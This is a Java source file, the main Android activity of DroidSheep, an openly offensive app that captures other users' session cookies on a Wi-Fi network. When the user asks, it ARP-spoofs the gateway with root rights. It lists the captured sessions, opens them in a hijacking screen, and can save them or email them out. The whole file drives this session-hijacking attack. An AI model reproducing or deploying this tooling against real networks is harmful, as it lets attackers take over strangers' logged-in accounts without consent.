/*
 * ListenActivity.java is the starting Activity, listening for cookies Copyright
 * (C) 2011 Andreas Koch <koch.trier@gmail.com>
 * 
 * This software was supported by the University of Trier
 * 
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 3 of the License, or (at your option) any later
 * version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * 
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package de.trier.infsec.koch.droidsheep.activities;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Hashtable;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiConfiguration.Status;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.format.Formatter;
import android.util.Log;
import android.view.ContextMenu;
import android.view.ContextMenu.ContextMenuInfo;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnCreateContextMenuListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.AdapterView.OnItemLongClickListener;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import de.trier.infsec.koch.droidsheep.R;
import de.trier.infsec.koch.droidsheep.arpspoof.ArpspoofService;
import de.trier.infsec.koch.droidsheep.arpspoof.RootAccess;
import de.trier.infsec.koch.droidsheep.auth.Auth;
import de.trier.infsec.koch.droidsheep.auth.AuthHelper;
import de.trier.infsec.koch.droidsheep.helper.Constants;
import de.trier.infsec.koch.droidsheep.helper.DBHelper;
import de.trier.infsec.koch.droidsheep.helper.MailHelper;
import de.trier.infsec.koch.droidsheep.helper.SetupHelper;
import de.trier.infsec.koch.droidsheep.helper.SystemHelper;
import de.trier.infsec.koch.droidsheep.objects.SessionListView;
import de.trier.infsec.koch.droidsheep.objects.WifiChangeChecker;
import de.trier.infsec.koch.droidsheep.thread.ListenService;
import de.trier.infsec.koch.droidsheep.thread.ListenThread;

public class ListenActivity extends Activity implements OnClickListener, OnItemClickListener, OnItemLongClickListener,
		OnCreateContextMenuListener {

	public static volatile Hashtable<String, Auth> authList = new Hashtable<String, Auth>();
	public static boolean disclaimerAccepted = false;

	private SessionListView sessionListView;
	private TextView tstatus;
	private TextView tnetworkConnected;
	private TextView tnetworkName;
	private TextView tnetworkEncryption;
	private ProgressBar pbrunning;

	private int sessionListViewSelected;
	private String sessionListViewSelectedKey;

	private boolean networkConnected = false;
	private boolean networkEncryptionWPA = false;
	private String networkName = "";

	public static boolean unrooted = false;

	private int lastNotification = 0;
	private NotificationManager mNotificationManager = null;

	public static boolean generic = true;
	private Handler handler = new Handler() {
		@Override
		public synchronized void handleMessage(Message msg) {
			String type = msg.getData().getString(Constants.BUNDLE_KEY_TYPE);
			if (type != null && type.equals(Constants.BUNDLE_TYPE_WIFICHANGE)) {
				if (!isListening())
					return;
				Toast t = Toast.makeText(getApplicationContext(), getString(R.string.toast_wifi_lost), Toast.LENGTH_SHORT);
				t.show();
				stopListening();
				stopSpoofing();
				cleanup();
				updateNetworkSettings();
			} else if (type != null && type.equals(Constants.BUNDLE_TYPE_NEWAUTH)) {
				ListenActivity.this.refresh();
				ListenActivity.this.notifyUser(false);
			} else if (type != null && type.equals(Constants.BUNDLE_TYPE_START)) {
				Button button = (Button) findViewById(R.id.bstartstop);
				button.setEnabled(false);
				if (!isListening() && isSpoofing()) {
					stopSpoofing();
				}

				if (!isListening()) {
					CheckBox cbSpoof = (CheckBox) findViewById(R.id.cbarpspoof);
					if (cbSpoof.isChecked()) {
						startSpoofing();
					} else {
						stopSpoofing();
					}
					startListening();
					notifyUser(true);
					refreshHandler.sleep();
				}
				button.setEnabled(true);
				handler.removeMessages(0);
			} else if (type != null && type.equals(Constants.BUNDLE_TYPE_STOP)) {
				stopListening();
				stopSpoofing();
				refreshHandler.stop();
				refresh();
			}
		};
	};

	RefreshHandler refreshHandler = new RefreshHandler();

	class RefreshHandler extends Handler {
		@Override
		public void handleMessage(Message msg) {
			ListenActivity.this.refreshStatus();
			sleep();
		}

		public void sleep() {
			this.removeMessages(0);
			sendMessageDelayed(obtainMessage(0), 1000);
		}

		public void stop() {
			this.removeMessages(0);
		}
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		if (!RootAccess.isGranted()) {
			unrooted = true;
		} else {
			SetupHelper.checkPrerequisites(this.getApplicationContext());
			AuthHelper.init(this.getApplicationContext(), handler);
			WifiChangeChecker wi = new WifiChangeChecker(handler);
			this.getApplicationContext().registerReceiver(wi, new IntentFilter(WifiManager.WIFI_STATE_CHANGED_ACTION));
		}
	}

	@Override
	protected void onStart() {
		super.onStart();
		if (unrooted) {
			showUnrooted();
			return;
		}
		setContentView(R.layout.listen);
		Button button = (Button) findViewById(R.id.bstartstop);
		//		Button buttonSpoof = (Button) findViewById(R.id.bspoof);

		button.setOnClickListener(this);
		//		buttonSpoof.setOnClickListener(this);
		if (ListenThread.running) {
			button.setText(getString(R.string.button_stop));
		} else {
			button.setText(getString(R.string.button_start));
		}
		tstatus = (TextView) findViewById(R.id.status);
		tnetworkConnected = (TextView) findViewById(R.id.networkconnected);
		tnetworkEncryption = (TextView) findViewById(R.id.hasWPA);
		tnetworkName = (TextView) findViewById(R.id.networkname);
		pbrunning = (ProgressBar) findViewById(R.id.progressBar1);

		this.sessionListView = ((SessionListView) findViewById(R.id.sessionlist));
		this.sessionListView.setOnItemClickListener(this);
		this.sessionListView.setOnCreateContextMenuListener(this);

		mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
		ListenActivity.generic = DBHelper.getGeneric(this);
		showDisclaimer();
	}

	private void showDisclaimer() {
		if (disclaimerAccepted)
			return;

		LayoutInflater inflater = (LayoutInflater) getApplicationContext().getSystemService(LAYOUT_INFLATER_SERVICE);
		final View layout = inflater.inflate(R.layout.disclaimer, (ViewGroup) findViewById(R.id.layout_root));

		AlertDialog al = new AlertDialog(this) {
			@Override
			public boolean onSearchRequested() {
				return false;
			}
		};
		al.setView(layout);
		al.setButton("OK", new DialogInterface.OnClickListener() {
			@Override
			public void onClick(DialogInterface dialog, int which) {
				CheckBox cb = (CheckBox) layout.findViewById(R.id.lic_ack);
				if (!cb.isChecked()) {
					Toast t = Toast.makeText(ListenActivity.this, getString(R.string.accept_text), Toast.LENGTH_SHORT);
					t.show();
					showDisclaimer();
				} else {
					disclaimerAccepted = true;
				}
			}
		});
		al.setCancelable(false);
		al.show();
	}

	private void showUnrooted() {
		LayoutInflater inflater = (LayoutInflater) getApplicationContext().getSystemService(LAYOUT_INFLATER_SERVICE);
		final View layout = inflater.inflate(R.layout.unrooted, (ViewGroup) findViewById(R.id.layout_root));

		AlertDialog al = new AlertDialog(this) {
			@Override
			public boolean onSearchRequested() {
				return false;
			}
		};
		al.setView(layout);
		al.setButton("OK", new DialogInterface.OnClickListener() {
			@Override
			public void onClick(DialogInterface dialog, int which) {
				finish();
			}
		});
		al.setCancelable(false);
		al.show();
	}

	@Override
	protected void onResume() {
		super.onResume();
		if (unrooted)
			return;
		SystemHelper.readAuthFiles(this);
		refresh();
		//		mNotificationManager.cancelAll();
	}

	@Override
	protected void onDestroy() {
		try {
			cleanup();
		} catch (Exception e) {
			Log.e(Constants.APPLICATION_TAG, "Error while onDestroy", e);
		}
		super.onDestroy();
	}

	@Override
	public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
		if (view == null) {
			return;
		}
		
		if (sessionListView == null) {
			sessionListView = (SessionListView) findViewById(R.id.sessionlist);
		}

		if (view != null) {
			sessionListViewSelected = position;
			sessionListViewSelectedKey = (String) authList.keySet().toArray()[position];
			
			sessionListView.showContextMenuForChild(view);
		}
	}

	@Override
	public boolean onItemLongClick(AdapterView<?> parent, View view, int position, long id) {
		onItemClick(parent, view, position, id);
		return false;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		switch (item.getItemId()) {
		case Constants.MENU_WIFILIST_ID:
			startActivity(new Intent(WifiManager.ACTION_PICK_WIFI_NETWORK));
			break;
		case Constants.MENU_CLEAR_SESSIONLIST_ID:
			authList.clear();
			refresh();
			mNotificationManager.cancelAll();
			break;
		case Constants.MENU_EXIT_ID:
			authList.clear();
			mNotificationManager.cancelAll();
			stopListening();
			stopSpoofing();
			finish();
			break;
		case Constants.MENU_GENERIC:
			generic = !generic;
			DBHelper.setGeneric(this, generic);
			break;
		case Constants.MENU_CLEAR_BLACKLIST_ID:
			clearBlacklist();
			break;
		case Constants.MENU_HELP_FORUM:
		    String url = "http://droidsheep.de/forum";  
		    Intent i = new Intent(Intent.ACTION_VIEW);  
		    i.setData(Uri.parse(url));  
		    startActivity(i);
			break;
		}
		return false;
	}

	@Override
	public boolean onContextItemSelected(MenuItem item) {
		Auth a = null;
		switch (item.getItemId()) {
		case Constants.ID_MOBILE:
			click(sessionListViewSelected, true);
			break;
		case Constants.ID_NORMAL:
			click(sessionListViewSelected, false);
			break;
		case Constants.ID_REMOVEFROMLIST:
			authList.remove(authList.keySet().toArray(new String[] {})[sessionListViewSelected]);
			refresh();
			break;
		case Constants.ID_BLACKLIST:
			a = authList.get(authList.keySet().toArray(new String[] {})[sessionListViewSelected]);
			AuthHelper.addToBlackList(this, a.getName());
			authList.remove(a.getId());
			refresh();
			break;
		case Constants.ID_SAVE:
			a = authList.get(authList.keySet().toArray(new String[] {})[sessionListViewSelected]);
			SystemHelper.saveAuthToFile(this, a);
			refresh();
			break;
		case Constants.ID_DELETE:
			a = authList.get(authList.keySet().toArray(new String[] {})[sessionListViewSelected]);
			SystemHelper.deleteAuthFile(this, a);
			refresh();
			break;
		case Constants.ID_EXPORT:
			a = authList.get(authList.keySet().toArray(new String[] {})[sessionListViewSelected]);
			MailHelper.sendAuthByMail(this, a);
			break;
		}
		return true;
	}

	@Override
	public void onClick(View v) {
		if (v.getId() == R.id.bstartstop) {
			Message m = handler.obtainMessage();
			Bundle b = new Bundle();
			if (!isListening()) {
				b.putString(Constants.BUNDLE_KEY_TYPE, Constants.BUNDLE_TYPE_START);
			} else {
				b.putString(Constants.BUNDLE_KEY_TYPE, Constants.BUNDLE_TYPE_STOP);
			}
			m.setData(b);
			handler.sendMessage(m);
		}
	}

	private void startSpoofing() {
		WifiManager wManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
		WifiInfo wInfo = wManager.getConnectionInfo();

		//Check to see if we're connected to wifi
		int localhost = wInfo.getIpAddress();
		if (localhost != 0) {
			String gatewayIP = Formatter.formatIpAddress(wManager.getDhcpInfo().gateway);
			String localhostIP = Formatter.formatIpAddress(localhost);
			//If nothing was entered for the ip address use the gateway
			if (gatewayIP.trim().equals(""))
				gatewayIP = Formatter.formatIpAddress(wManager.getDhcpInfo().gateway);

			//determining wifi network interface
			InetAddress localInet;
			String interfaceName = null;
			try {
				localInet = InetAddress.getByName(localhostIP);
				NetworkInterface wifiInterface = NetworkInterface.getByInetAddress(localInet);
				interfaceName = wifiInterface.getDisplayName();
			} catch (UnknownHostException e) {
				Log.e(Constants.APPLICATION_TAG, "error getting localhost's InetAddress", e);
			} catch (SocketException e) {
				Log.e(Constants.APPLICATION_TAG, "error getting wifi network interface", e);
			}

			Intent intent = new Intent(this, ArpspoofService.class);
			Bundle mBundle = new Bundle();
			mBundle.putString("gateway", gatewayIP);
			mBundle.putString("localBin", SystemHelper.getARPSpoofBinaryPath(this));
			mBundle.putString("interface", interfaceName);
			intent.putExtras(mBundle);

			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
			}
			startService(intent);
		} else {
			CharSequence text = "Must be connected to wireless network.";
			Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show();
		}
	}

	public void stopSpoofing() {
		Intent intent = new Intent(this, ArpspoofService.class);
		stopService(intent);
		try {
			Thread.sleep(200);
		} catch (InterruptedException e) {
		}
	}

	public void stopListening() {
		Intent intent = new Intent(this, ListenService.class);
		stopService(intent);
		try {
			Thread.sleep(200);
		} catch (InterruptedException e) {
		}
	}

	private boolean isSpoofing() {
		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
			if ("de.trier.infsec.koch.droidsheep.arpspoof.ArpspoofService".equals(service.service.getClassName())) {
				return true;
			}
		}
		return false;
	}

	private boolean isListening() {
		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
			if ("de.trier.infsec.koch.droidsheep.thread.ListenService".equals(service.service.getClassName())) {
				return true;
			}
		}
		return false;
	}

	@Override
	public void onCreateContextMenu(ContextMenu menu, View v, ContextMenuInfo menuInfo) {
		Auth actElem = null;
		if (sessionListViewSelectedKey == null || authList.get(sessionListViewSelectedKey) == null) {
			return;
		} else {
			actElem = authList.get(sessionListViewSelectedKey);
		}
		menu.setHeaderTitle(getString(R.string.menu_choose_page_title));
		menu.add(ContextMenu.NONE, Constants.ID_NORMAL, ContextMenu.NONE, getString(R.string.menu_open_normal));
		menu.add(ContextMenu.NONE, Constants.ID_REMOVEFROMLIST, ContextMenu.NONE, getString(R.string.menu_remove_from_list));
		menu.add(ContextMenu.NONE, Constants.ID_BLACKLIST, ContextMenu.NONE, getString(R.string.menu_black_list));
		menu.add(ContextMenu.NONE, Constants.ID_EXPORT, ContextMenu.NONE, getString(R.string.menu_export));

		if (actElem.isSaved()) {
			menu.add(ContextMenu.NONE, Constants.ID_DELETE, ContextMenu.NONE, getString(R.string.menu_delete));
		} else {
			menu.add(ContextMenu.NONE, Constants.ID_SAVE, ContextMenu.NONE, getString(R.string.menu_save));
		}

		if (actElem.getMobileUrl() != null) {
			menu.add(ContextMenu.NONE, Constants.ID_MOBILE, ContextMenu.NONE, getString(R.string.menu_open_mobile));
		}
	}

	@Override
	public boolean onPrepareOptionsMenu(Menu menu) {
		super.onCreateOptionsMenu(menu);
		menu.clear();
		menu.add(0, Constants.MENU_WIFILIST_ID, 0, getString(R.string.menu_wifilist));
		menu.add(0, Constants.MENU_CLEAR_SESSIONLIST_ID, 0, getString(R.string.menu_clear_sessionlist));
		if (ListenActivity.generic) {
			menu.add(0, Constants.MENU_GENERIC, 0, getString(R.string.menu_disable_generic));
		} else {
			menu.add(0, Constants.MENU_GENERIC, 0, getString(R.string.menu_enable_generic));
		}
		menu.add(0, Constants.MENU_CLEAR_BLACKLIST_ID, 0, getString(R.string.menu_blacklist_clear));
		menu.add(0, Constants.MENU_HELP_FORUM, 0, getString(R.string.menu_helpforum));
		menu.add(0, Constants.MENU_EXIT_ID, 0, getString(R.string.menu_exit));
		return true;
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	public void click(int id, boolean mobilePage) {
		if (authList.isEmpty()) {
			Toast.makeText(this.getApplicationContext(), "No Auth available...", Toast.LENGTH_SHORT).show();
			return;
		}
		String key = (String) authList.keySet().toArray()[id];

		Bundle b = new Bundle();
		b.putString(Constants.BUNDLE_KEY_ID, key);
		b.putBoolean(Constants.BUNDLE_KEY_MOBILE, mobilePage);

		Intent intent = new Intent(ListenActivity.this, HijackActivity.class);
		intent.putExtras(b);
		startActivity(intent);
	}

	private void startListening() {
		SystemHelper.execSUCommand(Constants.CLEANUP_COMMAND_DROIDSHEEP);
		SystemHelper.execSUCommand(Constants.CLEANUP_COMMAND_ARPSPOOF);

		updateNetworkSettings();
		if (!networkConnected) {
			Toast.makeText(this.getApplicationContext(), "You seem to be not connected to any network! Trying anyway...",
					Toast.LENGTH_LONG).show();
		}

		if (networkEncryptionWPA && !isSpoofing()) {
			//			Toast.makeText(this.getApplicationContext(), "This network is WPA encrypted. ARP-Spoofing will be automaticalle enabled!", Toast.LENGTH_LONG).show();
			Toast.makeText(this.getApplicationContext(),
					"This network is WPA encrypted. Without ARP-Spoofing you won´t find sessions...!", Toast.LENGTH_LONG).show();
			//			startSpoofing();
		}

		Button bstartstop = (Button) findViewById(R.id.bstartstop);

		if (!isListening()) {
			Intent intent = new Intent(this, ListenService.class);
			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
			}
			startService(intent);
			bstartstop.setText("Stop");
		} else {
			Toast t = Toast.makeText(this.getApplicationContext(), getString(R.string.toast_process_running_text),
					Toast.LENGTH_SHORT);
			t.show();
		}
		refresh();
	}

	private void cleanup() {
		tstatus.setText(getString(R.string.label_not_running));
		tstatus.setTextColor(Color.YELLOW);
		pbrunning.setVisibility(ProgressBar.INVISIBLE);
		Button button = ((Button) findViewById(R.id.bstartstop));
		button.setText("Start");
		stopSpoofing();
		stopListening();
		SystemHelper.execNewSUCommand(Constants.CLEANUP_COMMAND_ARPSPOOF);
		SystemHelper.execNewSUCommand(Constants.CLEANUP_COMMAND_DROIDSHEEP);
	}

	private void refresh() {
		boolean listening = isListening();

		refreshStatus();

		Button bstartstop = (Button) findViewById(R.id.bstartstop);
		if (listening) {
			bstartstop.setText("Stop");
		} else {
			bstartstop.setText("Start");
			mNotificationManager.cancelAll();
			refreshHandler.stop();
		}

		updateNetworkSettings();
		sessionListView.refresh();
	}

	public void refreshStatus() {
		boolean listening = isListening();
		boolean spoofing = isSpoofing();

		if (listening && !spoofing) {
			tstatus.setText(getString(R.string.label_running));
			tstatus.setTextColor(Color.GREEN);
			tstatus.setTextSize(15);
			pbrunning.setVisibility(ProgressBar.VISIBLE);
		} else if (listening && spoofing) {
			tstatus.setText(getString(R.string.label_running_and_spoofing));
			tstatus.setTextColor(Color.GREEN);
			tstatus.setTextSize(15);
			pbrunning.setVisibility(ProgressBar.VISIBLE);
		} else if (!listening && spoofing) {
			tstatus.setText(getString(R.string.label_not_running_and_spoofing));
			tstatus.setTextColor(Color.YELLOW);
			tstatus.setTextSize(15);
			pbrunning.setVisibility(ProgressBar.INVISIBLE);
		} else {
			tstatus.setText(getString(R.string.label_not_running));
			tstatus.setTextColor(Color.YELLOW);
			tstatus.setTextSize(15);
			pbrunning.setVisibility(ProgressBar.INVISIBLE);
		}

	}

	private void updateNetworkSettings() {
		WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
		if (!(wm.getWifiState() == WifiManager.WIFI_STATE_ENABLED)) {
			networkConnected = false;
			networkEncryptionWPA = false;

			networkName = "- None -";
			tnetworkName.setText(getString(R.string.label_networkname_pref) + networkName.toUpperCase());

			tnetworkConnected.setText(getString(R.string.label_status_disconnected));
			tnetworkConnected.setTextColor(Color.RED);

			tnetworkEncryption.setText("");
		}

		for (WifiConfiguration wc : wm.getConfiguredNetworks()) {
			if (!(wc.status == Status.CURRENT))
				continue;
			networkConnected = true;
			tnetworkConnected.setText(getString(R.string.label_status_connected));
			tnetworkConnected.setTextColor(Color.GREEN);

			networkName = wc.SSID != null ? wc.SSID : "";
			tnetworkName.setText(getString(R.string.label_networkname_pref) + networkName.toUpperCase());

			if (wc.preSharedKey != null) {
				networkEncryptionWPA = true;
				tnetworkEncryption.setText(getString(R.string.label_wpa_network));
				tnetworkEncryption.setTextColor(Color.RED);
			} else {
				networkEncryptionWPA = false;
				if (wc.wepKeys[0] != null) {
					tnetworkEncryption.setText(getString(R.string.label_wep_network));
					tnetworkEncryption.setTextColor(Color.YELLOW);
				} else {
					tnetworkEncryption.setText(getString(R.string.label_open_network));
					tnetworkEncryption.setTextColor(Color.GREEN);
				}
			}
		}
	}

	private void notifyUser(boolean persistent) {
		if (lastNotification >= authList.size())
			return;
		lastNotification = authList.size();

		int icon = R.drawable.droidsheep_square;
		long when = System.currentTimeMillis();
		Notification notification = new Notification(icon, getString(R.string.notification_title), when);

		Context context = getApplicationContext();
		Intent notificationIntent = new Intent(ListenActivity.this, ListenActivity.class);
		PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);

		if (persistent) {
			notification.setLatestEventInfo(context, "DroidSheep is listening for sessions",
					getString(R.string.notification_text), contentIntent);
		} else {
			notification.setLatestEventInfo(context, getString(R.string.notification_title),
					getString(R.string.notification_text), contentIntent);
		}
		mNotificationManager.notify(Constants.NOTIFICATION_ID, notification);
	}

	public void clearBlacklist() {
		AlertDialog.Builder builder = new AlertDialog.Builder(this);
		builder.setMessage(R.string.clear_blacklist).setCancelable(false)
				.setPositiveButton(R.string.clear_blacklist_ok, new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int id) {
						DBHelper.clearBlacklist(ListenActivity.this);
						AuthHelper.clearBlacklist();
					}
				}).setNegativeButton(R.string.clear_blacklist_abprt, new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int id) {
						dialog.cancel();
					}
				});
		AlertDialog alert = builder.create();
		alert.show();
	}

}